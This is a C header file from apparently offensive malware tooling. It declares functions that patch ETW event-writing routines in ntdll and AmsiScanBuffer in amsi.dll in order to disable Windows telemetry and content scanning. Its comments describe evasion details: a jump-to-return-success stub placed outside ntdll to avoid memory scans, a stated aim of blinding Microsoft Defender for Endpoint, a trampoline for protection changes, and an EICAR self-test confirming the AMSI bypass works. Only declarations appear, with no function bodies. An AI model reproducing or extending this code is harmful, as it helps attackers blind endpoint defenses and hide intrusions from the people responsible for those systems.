/*
 * etw.h — ETW and AMSI patching for telemetry evasion
 */

#ifndef ETW_H
#define ETW_H

/* Patch the full ETW write surface in ntdll (EtwEventWrite, EtwEventWriteEx,
 * EtwEventWriteTransfer, EtwEventWriteFull, NtTraceEvent) via a stealthy
 * jmp-to-return-success stub in our own RX region (no in-place 0xC3 that
 * defenders memory-scan for). Blinds MDE's primary ETW telemetry pipeline.
 * All protection changes go through halos_invoke (persistent trampoline). */
void etw_patch(void);

/* Patch AmsiScanBuffer in amsi.dll to return E_INVALIDARG.
 * Disables AMSI content scanning. */
void amsi_patch(void);

/* Exercise AmsiScanBuffer with the EICAR test string and print the
 * verdict via DBG_PRINTF. Lets a lab operator eyeball that the AMSI
 * HWBP is live (result==0 under bypass, >=32768 otherwise). */
void amsi_selftest(void);

#endif /* ETW_H */